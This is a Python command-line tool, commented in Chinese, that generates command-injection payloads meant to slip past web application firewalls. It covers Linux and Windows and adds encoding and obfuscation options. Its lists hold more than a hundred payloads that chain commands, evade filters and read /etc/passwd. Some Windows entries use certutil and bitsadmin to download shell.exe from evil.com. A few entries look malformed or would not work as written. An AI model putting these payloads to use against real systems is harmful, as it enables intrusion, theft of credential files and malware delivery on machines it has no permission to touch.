#!/usr/bin/env python3
"""
命令注入 WAF 绕过 Payload 生成器
内置 100+ 绕过 payload，覆盖分隔符绕过、空格绕过、关键字绕过、编码绕过、
通配符绕过、变量绕过、引号绕过、反斜杠绕过、花括号扩展等，支持 Linux/Windows。
"""

import argparse
import base64
import json
import os
import random
import signal
import sys


# ============================================================
# 命令注入绕过 Payload 数据库（100+）
# ============================================================

# 分隔符绕过
SEPARATOR_BYPASS = [
    ("分号", "; id"),
    ("管道符", "| id"),
    ("AND", "&& id"),
    ("OR", "|| id"),
    ("后台执行", "& id"),
    ("无空格分号", ";id"),
    ("无空格管道", "|id"),
    ("反引号", "`id`"),
    ("命令替换", "$(id)"),
    ("换行符", "\nid"),
    ("%0a换行", "%0aid"),
    ("%0d回车", "%0did"),
    ("%0a%0d", "%0a%0did"),
    ("分号+空格", "; id"),
    ("多重分号", ";;; id"),
    ("多重管道", "||| id"),
    ("多重AND", "&&& id"),
    ("换行+分号", "\n; id"),
    ("%0a+分号", "%0a; id"),
    ("Tab+分号", "\t; id"),
    ("分号+分号", "; ; id"),
    ("管道+管道", "| | id"),
]

# 空格绕过
SPACE_BYPASS_CMD = [
    ("IFS绕过", "${IFS}id"),
    ("IFS2", "$IFS id"),
    ("IFS3", "$IFS${IFS}id"),
    ("花括号", "{cat,/etc/passwd}"),
    ("花括号2", "{id}"),
    ("重定向", "cat</etc/passwd"),
    ("重定向2", "id<"),
    ("Tab绕过", "id\t"),
    ("%09绕过", "id%09"),
    ("IFS+命令", "cat${IFS}/etc/passwd"),
    ("IFS变量", "a=$IFS;cat$a/etc/passwd"),
    ("IFS+变量", "cat${IFS}./etc/passwd"),
    ("花括号cat", "{cat,/etc/passwd}"),
    ("花括号ls", "{ls,-la}"),
    ("花括号id", "{id}"),
    ("<绕过", "cat<>/etc/passwd"),
    ("<>绕过", "cat<>/etc/passwd"),
    ("%0a绕过", "cat%0a/etc/passwd"),
    ("%0b绕过", "cat%0b/etc/passwd"),
    ("%0c绕过", "cat%0c/etc/passwd"),
    ("%0d绕过", "cat%0d/etc/passwd"),
    ("IFS+多", "${IFS}${IFS}${IFS}id"),
    ("$@绕过", "cat$@/etc/passwd"),
    ("$*绕过", "cat$*/etc/passwd"),
]

# 关键字绕过 - cat
CAT_BYPASS = [
    ("反斜杠", "c\\at /etc/passwd"),
    ("单引号", "ca''t /etc/passwd"),
    ("双引号", "ca\"\"t /etc/passwd"),
    ("完整路径", "/bin/cat /etc/passwd"),
    ("more替代", "more /etc/passwd"),
    ("less替代", "less /etc/passwd"),
    ("head替代", "head /etc/passwd"),
    ("tail替代", "tail /etc/passwd"),
    ("tac替代", "tac /etc/passwd"),
    ("nl替代", "nl /etc/passwd"),
    ("sort替代", "sort /etc/passwd"),
    ("rev替代", "rev /etc/passwd | rev"),
    ("strings替代", "strings /etc/passwd"),
    ("xxd替代", "xxd /etc/passwd"),
    ("od替代", "od /etc/passwd"),
    ("base64替代", "base64 /etc/passwd"),
    ("sed替代", "sed -n '1,$p' /etc/passwd"),
    ("awk替代", "awk '{print}' /etc/passwd"),
    ("paste替代", "paste /etc/passwd"),
    ("cut替代", "cut -d: -f1 /etc/passwd"),
    ("expand替代", "expand /etc/passwd"),
    ("fold替代", "fold /etc/passwd"),
    ("fmt替代", "fmt /etc/passwd"),
    ("pr替代", "pr /etc/passwd"),
    ("comm替代", "comm /etc/passwd /dev/null"),
    ("diff替代", "diff /etc/passwd /dev/null"),
    ("uniq替代", "uniq /etc/passwd"),
    ("look替代", "look '' /etc/passwd"),
    ("file替代", "file -f /etc/passwd"),
    ("dd替代", "dd if=/etc/passwd"),
    ("grep替代", "grep '' /etc/passwd"),
    ("egrep替代", "egrep '' /etc/passwd"),
    ("fgrep替代", "fgrep '' /etc/passwd"),
]

# 关键字绕过 - 其他命令
KEYWORD_BYPASS_CMD = [
    ("ls反斜杠", "l\\s"),
    ("ls单引号", "l''s"),
    ("ls双引号", "l\"\"s"),
    ("ls完整路径", "/bin/ls"),
    ("dir替代", "dir"),
    ("id反斜杠", "i\\d"),
    ("id单引号", "i''d"),
    ("id完整路径", "/usr/bin/id"),
    ("whoami反斜杠", "who\\ami"),
    ("whoami单引号", "who''ami"),
    ("whoami完整路径", "/usr/bin/whoami"),
    ("uname反斜杠", "un\\ame"),
    ("uname单引号", "un''ame"),
    ("ifconfig反斜杠", "ifco\\nfig"),
    ("ifconfig单引号", "ifco''nfig"),
    ("netstat反斜杠", "netst\\at"),
    ("netstat单引号", "netst''at"),
    ("ps反斜杠", "p\\s"),
    ("ps单引号", "p''s"),
    ("wget反斜杠", "wg\\et"),
    ("wget单引号", "wg''et"),
    ("curl反斜杠", "cu\\rl"),
    ("curl单引号", "cu''rl"),
    ("nc反斜杠", "n\\c"),
    ("nc单引号", "n''c"),
    ("python反斜杠", "pyt\\hon"),
    ("python单引号", "pyt''hon"),
    ("perl反斜杠", "pe\\rl"),
    ("perl单引号", "pe''rl"),
    ("ruby反斜杠", "ru\\by"),
    ("ruby单引号", "ru''by"),
    ("bash反斜杠", "ba\\sh"),
    ("bash单引号", "ba''sh"),
    ("sh反斜杠", "s\\h"),
    ("sh单引号", "s''h"),
]

# 编码绕过
ENCODING_BYPASS_CMD = [
    ("printf十六进制", "$(printf '\\x63\\x61\\x74') /etc/passwd"),
    ("printf八进制", "$(printf '\\143\\x61\\x74') /etc/passwd"),
    ("base64解码", "$(echo Y2F0 | base64 -d) /etc/passwd"),
    ("hex解码", "$(echo 636174 | xxd -r -p) /etc/passwd"),
    ("printf绕过", "$(printf 'cat') /etc/passwd"),
    ("echo绕过", "$(echo cat) /etc/passwd"),
    ("$()绕过", "$({cat,/etc/passwd})"),
    ("变量+printf", "a=cat;b=/etc/passwd;$(printf $a) $(printf $b)"),
    ("printf+IFS", "$(printf '\\x63\\x61\\x74')${IFS}$(printf '\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')"),
    ("base64完整", "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"),
    ("printf十六进制完整", "$(printf '\\x69\\x64')"),
    ("printf八进制完整", "$(printf '\\151\\144')"),
    ("$0绕过", "$0"),  # 执行当前 shell
    ("$(())绕过", "$(echo${IFS}cat)${IFS}/etc/passwd"),
    ("xargs绕过", "echo cat | xargs /etc/passwd"),
]

# 通配符绕过
WILDCARD_BYPASS = [
    ("cat通配符", "/bin/c?t /etc/p?sswd"),
    ("cat全通配符", "/bin/c* /etc/p*"),
    ("cat双通配符", "/bin/c?? /etc/p??ss??"),
    ("cat通配符3", "/???/c?t /???/p?ss??"),
    ("ls通配符", "/bin/l?"),
    ("id通配符", "/usr/bin/i?"),
    ("whoami通配符", "/usr/bin/who?mi"),
    ("cat通配符4", "/bin/c[a]t /etc/passwd"),
    ("cat范围通配符", "/bin/c[a-z]t /etc/passwd"),
    ("cat否定通配符", "/bin/c[^a]t /etc/passwd"),
    ("cat花括号通配符", "/bin/c{a}t /etc/passwd"),
    ("全路径通配符", "/???/???/c?t /???/???/p?ss??"),
    ("cat通配符+IFS", "/bin/c?${IFS}/etc/p?ss??"),
]

# 变量绕过
VARIABLE_BYPASS = [
    ("变量拼接", "a=cat;b=/etc/passwd;$a $b"),
    ("变量拼接2", "a=ca;b=t;$a$b /etc/passwd"),
    ("变量拼接3", "a=c;b=at;$a$b /etc/passwd"),
    ("变量+IFS", "a=cat;b=/etc/passwd;$a${IFS}$b"),
    ("变量+引号", "a=cat;b='/etc/passwd';$a $b"),
    ("变量+eval", "a=cat;b=/etc/passwd;eval $a $b"),
    ("变量+exec", "a=cat;b=/etc/passwd;exec $a $b"),
    ("多变量", "a=c;b=a;c=t;d=/;e=etc;f=passwd;$a$b$c $d$e/$f"),
    ("变量+printf", "a=cat;$(printf $a) /etc/passwd"),
    ("变量+反引号", "a=cat;`$a` /etc/passwd"),
    ("变量+命令替换", "a=cat;b=$($a /etc/passwd);echo $b"),
    ("变量数组", "a=(cat /etc/passwd);${a[0]} ${a[1]}"),
    ("变量+偏移", "a=catx;$a /etc/passwd"),  # 简单变量
    ("变量拼接4", "a=c;b=at;$a$b</etc/passwd"),
    ("变量+花括号", "a=cat;${a} /etc/passwd"),
]

# 引号绕过
QUOTE_BYPASS = [
    ("双引号绕过", "c\"\"at /etc/pas\"\"swd"),
    ("单引号绕过", "c''at /etc/pas''swd"),
    ("混合引号", "c''at /etc/pas\"\"swd"),
    ("双引号cat", "c\"at\" /etc/passwd"),
    ("单引号cat", "c'at' /etc/passwd"),
    ("双引号完整", "\"cat\" \"/etc/passwd\""),
    ("单引号完整", "'cat' '/etc/passwd'"),
    ("混合引号2", "ca\"t\" /etc/pa''sswd"),
    ("引号+反斜杠", "c\"\\a\"t /etc/passwd"),
    ("引号+变量", "c\"\"at /etc/$a"),
]

# 反斜杠绕过
BACKSLASH_BYPASS = [
    ("反斜杠cat", "c\\at /etc/passwd"),
    ("反斜杠path", "cat /etc/p\\asswd"),
    ("反斜杠完整", "c\\at /etc/p\\asswd"),
    ("多反斜杠", "c\\\\at /etc/p\\\\asswd"),
    ("反斜杠+引号", "c\\a\\t /etc/p\\a\\s\\s\\w\\d"),
    ("反斜杠分隔", "c\\at\\ /etc/passwd"),
    ("反斜杠+IFS", "c\\at${IFS}/etc/passwd"),
    ("反斜杠+花括号", "c\\at{,/etc/passwd}"),
    ("反斜杠变量", "c\\at /etc/$a"),
    ("反斜杠通配符", "c\\?t /etc/p?sswd"),
]

# 花括号扩展
BRACE_BYPASS = [
    ("花括号扩展", "{cat,/etc/passwd}"),
    ("花括号序列", "{cat,/etc/passwd}"),
    ("花括号范围", "{c,}at /etc/passwd"),
    ("花括号多命令", "{cat,/etc/passwd;id}"),
    ("花括号嵌套", "{cat,{/etc,/}passwd}"),
    ("花括号+变量", "{cat,$HOME/.bashrc}"),
    ("花括号+通配符", "{c,}at /etc/p*"),
    ("花括号+引号", "{c,''at} /etc/passwd"),
    ("花括号+反斜杠", "{c,\\at} /etc/passwd"),
    ("花括号+IFS", "{cat,${IFS}/etc/passwd}"),
]

# Windows 特有绕过
WINDOWS_BYPASS = [
    ("^分隔符", "^& whoami"),
    ("^转义", "w^h^o^a^m^i"),
    ("%cd%变量", "%cd%"),
    ("cmd变量", "%COMSPEC% /c whoami"),
    ("set变量", "set a=whoami & call %a%"),
    ("echo+pipe", "echo whoami | cmd"),
    ("forfiles", "forfiles /p c:\\windows\\system32 /m cmd.exe /c cmd /c whoami"),
    ("WMIC", "wmic process call create whoami"),
    ("PowerShell", "powershell -c whoami"),
    ("PowerShell编码", "powershell -e dwBoAG8AYQBtAGkA"),
    ("certutil", "certutil -urlcache -split -f http://evil.com/shell.exe"),
    ("bitsadmin", "bitsadmin /transfer myjob http://evil.com/shell.exe C:\\shell.exe"),
    ("^换行", "whoami^\n"),
    ("set+call", "set a=who&set b=ami&call %a%%b%"),
    ("括号绕过", "(whoami)"),
    ("双引号", "\"whoami\""),
    ("cmd/c", "cmd /c whoami"),
    ("cmd/k", "cmd /k whoami"),
    ("start", "start whoami"),
    ("&&Windows", "whoami && ver"),
]


# ============================================================
# 编码函数
# ============================================================

def hex_encode(s):
    """十六进制编码。"""
    return "".join(f"\\x{ord(c):02x}" for c in s)


def octal_encode(s):
    """八进制编码。"""
    return "".join(f"\\{ord(c):o}" for c in s)


def base64_encode(s):
    """Base64 编码。"""
    return base64.b64encode(s.encode()).decode()


def url_encode(s):
    """URL 编码。"""
    return "".join(f"%{ord(c):02X}" if not c.isalnum() else c for c in s)


def encode_payload(payload, encode_type):
    """根据编码类型对 payload 进行编码。"""
    if encode_type == "none":
        return payload
    elif encode_type == "hex":
        return f"$(printf '{hex_encode(payload)}')"
    elif encode_type == "octal":
        return f"$(printf '{octal_encode(payload)}')"
    elif encode_type == "base64":
        return f"$(echo {base64_encode(payload)} | base64 -d)"
    elif encode_type == "all":
        encoders = [hex_encode, octal_encode, base64_encode]
        chosen = random.choice(encoders)
        if chosen == base64_encode:
            return f"$(echo {chosen(payload)} | base64 -d)"
        else:
            return f"$(printf '{chosen(payload)}')"
    return payload


# ============================================================
# 混淆函数
# ============================================================

def obfuscate_variable(payload):
    """变量混淆：将命令拆分为变量。"""
    # 简单示例：将 cat 拆分为 c 和 at
    if "cat " in payload:
        return payload.replace("cat ", "a=c;b=at;$a$b ")
    return payload


def obfuscate_quote(payload):
    """引号混淆：在命令中插入空引号。"""
    result = payload
    # 在命令名中间插入空引号
    import re
    # 匹配命令名
    match = re.match(r"^(\w+)(.*)", result)
    if match:
        cmd = match.group(1)
        rest = match.group(2)
        mid = len(cmd) // 2
        if mid > 0:
            result = cmd[:mid] + "''" + cmd[mid:] + rest
    return result


def obfuscate_wildcard(payload):
    """通配符混淆：用通配符替换路径。"""
    result = payload
    result = result.replace("/bin/", "/?in/")
    result = result.replace("/etc/", "/?tc/")
    result = result.replace("/usr/", "/?sr/")
    return result


def apply_obfuscation(payload, obfuscate_type):
    """应用混淆。"""
    if obfuscate_type == "none":
        return payload
    elif obfuscate_type == "variable":
        return obfuscate_variable(payload)
    elif obfuscate_type == "quote":
        return obfuscate_quote(payload)
    elif obfuscate_type == "wildcard":
        return obfuscate_wildcard(payload)
    elif obfuscate_type == "all":
        obfuscators = [obfuscate_variable, obfuscate_quote, obfuscate_wildcard]
        for obf in random.sample(obfuscators, min(2, len(obfuscators))):
            payload = obf(payload)
        return payload
    return payload


# ============================================================
# Payload 生成函数
# ============================================================

def generate_payloads(os_type, encode, obfuscate, count):
    """生成命令注入绕过 payload 列表。"""
    all_payloads = []

    # 收集 Linux payload
    linux_payloads = (
        SEPARATOR_BYPASS + SPACE_BYPASS_CMD + CAT_BYPASS +
        KEYWORD_BYPASS_CMD + ENCODING_BYPASS_CMD + WILDCARD_BYPASS +
        VARIABLE_BYPASS + QUOTE_BYPASS + BACKSLASH_BYPASS + BRACE_BYPASS
    )

    # 收集 Windows payload
    windows_payloads = WINDOWS_BYPASS

    if os_type == "linux":
        for method, payload in linux_payloads:
            all_payloads.append({"os": "linux", "original": payload, "bypass_method": method})
    elif os_type == "windows":
        for method, payload in windows_payloads:
            all_payloads.append({"os": "windows", "original": payload, "bypass_method": method})
    elif os_type == "all":
        for method, payload in linux_payloads:
            all_payloads.append({"os": "linux", "original": payload, "bypass_method": method})
        for method, payload in windows_payloads:
            all_payloads.append({"os": "windows", "original": payload, "bypass_method": method})

    # 去重
    seen = set()
    unique_payloads = []
    for p in all_payloads:
        if p["original"] not in seen:
            seen.add(p["original"])
            unique_payloads.append(p)

    # 应用编码和混淆
    result_payloads = []
    for i, p in enumerate(unique_payloads):
        original = p["original"]
        if obfuscate != "none":
            obfuscated = apply_obfuscation(original, obfuscate)
        else:
            obfuscated = original
        if encode != "none":
            encoded_payload = encode_payload(obfuscated, encode)
            is_encoded = True
        else:
            encoded_payload = obfuscated
            is_encoded = False

        result_payloads.append({
            "id": i + 1,
            "os": p["os"],
            "original": original,
            "bypass_method": p["bypass_method"],
            "payload": encoded_payload,
            "encoded": is_encoded,
        })

    if count > 0:
        result_payloads = result_payloads[:count]

    return result_payloads


# ============================================================
# 主函数
# ============================================================


_timeout_value = 300

def _timeout_handler(signum, frame):
    """超时信号处理器"""
    print(json.dumps({"status": "timeout", "error": f"操作超时({_timeout_value}秒)", "timeout": _timeout_value}, ensure_ascii=False))
    sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="命令注入 WAF 绕过 Payload 生成器"
    )
    parser.add_argument(
        "--os", default="linux",
        help="目标系统：linux/windows/all（默认 linux）"
    )
    parser.add_argument(
        "--encode", default="none",
        help="编码方式：none/hex/octal/base64/all（默认 none）"
    )
    parser.add_argument(
        "--obfuscate", default="none",
        help="混淆方式：none/variable/quote/wildcard/all（默认 none）"
    )
    parser.add_argument("--count", type=int, default=20, help="生成数量（默认 20）")
    parser.add_argument("--output", "-o", help="结果保存文件路径（可选）")
    parser.add_argument("--timeout", type=int, default=300, help="操作超时时间(秒)")
    args = parser.parse_args()

    global _timeout_value
    _timeout_value = args.timeout
    signal.signal(signal.SIGALRM, _timeout_handler)
    signal.alarm(args.timeout)

    try:
        payloads = generate_payloads(args.os, args.encode, args.obfuscate, args.count)

        result = {
            "os": args.os,
            "encode": args.encode,
            "obfuscate": args.obfuscate,
            "total_payloads": len(payloads),
            "payloads": payloads,
        }

        json_output = json.dumps(result, ensure_ascii=False, indent=2)

        if args.output:
            try:
                with open(args.output, "w", encoding="utf-8") as f:
                    f.write(json_output)
                print(f"结果已保存到: {args.output}")
            except IOError as e:
                print(json.dumps({"error": f"写入文件失败: {e}"}), file=sys.stderr)
                print(json_output)
        else:
            print(json_output)

    except Exception as e:
        print(json.dumps({"error": f"生成失败: {e}"}), file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
